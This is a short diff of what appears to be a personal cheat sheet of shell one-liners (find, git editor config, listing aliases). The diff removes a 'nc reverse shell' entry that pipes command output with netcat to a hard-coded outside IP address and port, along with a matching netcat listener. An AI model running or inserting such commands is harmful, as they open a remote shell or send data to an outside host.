@@ -205,9 +205,6 @@ pkgs.mkShell {
 - wsl `find / -not -path '/mnt/*'`
 - `find / -not -path '/mnt/*' -name python -not -path '/home/*'`
 - git config core.editor=code --wait --new-window
-- nc reverse shell
-  - exec command 2>&1 | nc 176.117.72.208 12345
-  - nc -l -p 12345 2>&1 | tee -a keklol
 - nv show .files
 - nvf current dir or sudo or ignore /proc etc
 - llt ls tree
